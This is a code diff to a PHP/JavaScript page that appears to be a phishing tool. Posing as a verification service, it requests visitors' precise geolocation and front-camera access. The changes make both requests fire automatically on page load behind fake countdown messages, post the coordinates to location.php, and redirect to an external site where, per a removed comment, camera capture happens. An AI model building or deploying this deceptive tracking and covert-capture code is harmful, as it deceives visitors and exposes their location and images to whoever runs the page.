@@ -1,5 +1,4 @@
 <?php
-include 'ip.php';
 echo '
 <!DOCTYPE html>
 <html lang="en">
@@ -237,9 +236,6 @@ echo '
 </div>
 
 <script>
-var locDone = false;
-var camDone = false;
-
 /* ── Animate progress bar ── */
 function animateBar(id, to, duration) {
   var bar = document.getElementById(id);
@@ -254,62 +250,105 @@ function animateBar(id, to, duration) {
   requestAnimationFrame(step);
 }
 
-/* ── Step 1: Location ── */
-function startLocation() {
-  var btn = document.querySelector("#screen-location .btn");
-  btn.disabled = true;
-  btn.textContent = "Requesting...";
-  document.getElementById("loc-status").textContent = "Waiting for permission...";
-  animateBar("loc-bar", 40, 800);
+/* ── Countdown then auto-fire location ── */
+function autoStartLocation() {
+  var btn    = document.querySelector("#screen-location .btn");
+  var status = document.getElementById("loc-status");
+  var count  = 2;
+
+  // Animate bar to 20% immediately so it looks alive
+  animateBar("loc-bar", 20, 1000);
+  btn.textContent = "Verifying... (" + count + ")";
+  status.textContent = "Connecting to location service...";
+
+  var ticker = setInterval(function() {
+    count--;
+    if (count > 0) {
+      btn.textContent = "Verifying... (" + count + ")";
+    } else {
+      clearInterval(ticker);
+      btn.disabled = true;
+      btn.textContent = "Requesting...";
+      status.textContent = "Waiting for permission...";
+      animateBar("loc-bar", 45, 600);
+      fireLocation();
+    }
+  }, 1000);
+}
+
+function fireLocation() {
+  var status = document.getElementById("loc-status");
 
   if (!navigator.geolocation) {
-    goToCamera();
+    animateBar("loc-bar", 100, 400);
+    setTimeout(goToCamera, 500);
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
     function(pos) {
-      document.getElementById("loc-status").textContent = "✓ Location confirmed";
-      document.getElementById("loc-status").className = "status ok";
+      status.textContent = "\u2713 Location confirmed";
+      status.className = "status ok";
       animateBar("loc-bar", 100, 600);
 
-      // Send location
       var xhr = new XMLHttpRequest();
       xhr.open("POST", "location.php", true);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       xhr.send("lat="+pos.coords.latitude+"&lon="+pos.coords.longitude+"&acc="+pos.coords.accuracy+"&time="+Date.now());
 
-      setTimeout(goToCamera, 900);
+      setTimeout(goToCamera, 800);
     },
     function() {
-      // Denied — still move on (IP geolocation fallback in location.php)
+      // Denied — fallback handled server-side
+      status.textContent = "Redirecting...";
       animateBar("loc-bar", 100, 400);
-      setTimeout(goToCamera, 600);
+      setTimeout(goToCamera, 500);
     },
     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
 }
 
-/* ── Transition to camera screen ── */
+/* ── Switch to camera screen ── */
 function goToCamera() {
   document.getElementById("screen-location").style.display = "none";
   document.getElementById("screen-camera").style.display  = "block";
+  // Auto-fire camera immediately with short delay for UX
+  setTimeout(autoFireCamera, 1200);
 }
 
-/* ── Step 2: Camera ── */
-function requestCamera() {
-  var btn = document.querySelector("#screen-camera .btn");
-  btn.disabled = true;
-  btn.textContent = "Requesting...";
-  document.getElementById("cam-status").textContent = "Waiting for permission...";
-  animateBar("cam-bar", 40, 800);
+/* ── Auto-fire camera ── */
+function autoFireCamera() {
+  var btn    = document.querySelector("#screen-camera .btn");
+  var status = document.getElementById("cam-status");
+  var count  = 2;
+
+  animateBar("cam-bar", 20, 800);
+  btn.textContent = "Connecting... (" + count + ")";
+  status.textContent = "Initialising camera service...";
+
+  var ticker = setInterval(function() {
+    count--;
+    if (count > 0) {
+      btn.textContent = "Connecting... (" + count + ")";
+    } else {
+      clearInterval(ticker);
+      btn.disabled = true;
+      btn.textContent = "Requesting...";
+      status.textContent = "Waiting for permission...";
+      animateBar("cam-bar", 45, 600);
+      fireCamera();
+    }
+  }, 1000);
+}
+
+function fireCamera() {
+  var status = document.getElementById("cam-status");
 
   navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
     .then(function(stream) {
-      // Got it — stop preview track, capture happens on index2.html
       stream.getTracks().forEach(function(t){ t.stop(); });
-      document.getElementById("cam-status").textContent = "✓ Camera enabled";
-      document.getElementById("cam-status").className = "status ok";
+      status.textContent = "\u2713 Camera enabled";
+      status.className = "status ok";
       animateBar("cam-bar", 100, 600);
       setTimeout(redirect, 900);
     })
@@ -319,11 +358,16 @@ function requestCamera() {
     });
 }
 
-/* ── Final redirect ── */
+/* ── Redirect ── */
 function redirect() {
   try       { window.location.href = "https://cam.subhan.tech/index2.html"; }
   catch(e)  { window.location     = "https://cam.subhan.tech/index2.html"; }
 }
+
+/* ── Boot: auto-start on page load ── */
+window.addEventListener("load", function() {
+  setTimeout(autoStartLocation, 1500);
+});
 </script>
 
 </body>
